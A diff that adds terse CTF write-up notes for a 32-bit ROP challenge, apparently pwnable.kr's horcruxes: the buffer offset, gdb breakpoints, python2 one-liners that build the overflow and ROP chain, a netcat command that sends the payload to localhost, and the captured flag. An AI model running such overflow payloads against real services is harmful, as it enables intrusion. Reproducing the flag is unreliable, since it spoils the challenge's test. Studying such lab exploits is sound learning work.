@@ -1,0 +1,40 @@
+1.call hint
+2.print initial string and get menu
+3.call ropme
+4.pass by alphabet functions
+5.print how much exp and get exp
+
+
+use gets call in ropme to start rop chain
+
+0x78 bytes till ra
+
+(python2 -c "print('3' + 'a'*121 + '\x25\x16\x04\x08')"; cat)
+
+python2 -c "print('3' + 'a'*121 + '\x9d\x12\x04\x08' + '\xcf\x12\x04\x08' + '\x01\x13\x04\x08' + '\x33\x13\x04\x08' + '\x65\x13\x04\x08' + '\x97\x13\x04\x08' + '\xc9\x13\x04\x08')"
+break *(ropme + 396)
+break *(ropme + 269)
+need to get to ropme+282 = 0x8041625 which starts flag retreival, problem...
+
+1. ebx value which is preserved through function calls is overwritten on ret with different value from the buffer
+overflow
+
+find way to set ebx to 0x8041512 + 0x2a79 before jumping to ropme+282, or get past conditional branch
+
+
+get past conditional branch:
+
+.edx is set to 0xe9bdb00c on first run, and 0xa8f5ac7b on the second, so it's random
+.edx set to 0x8041512 + 0x2a79 + 0x98 = 0x8044023
+
+solved:
+send following line to payload...
+python2 -c "print('3' + 'a'*121 + '\x9d\x12\x04\x08' + '\xcf\x12\x04\x08' + '\x01\x13\x04\x08' + '\x33\x13\x04\x08' + '\x65\x13\x04\x08' + '\x97\x13\x04\x08' + '\xc9\x13\x04\x08' + '\x0b\x15\x04\x08\n')"
+
+then repeat command...
+
+(cat <payload>; cat) | nc localhost 9032
+
+till the exp gained is a positive number that is less than the 32 bit limit, once that is achieved the following flag will be printed
+
+The_M4gic_sp3l1_is_Avada_Ked4vra
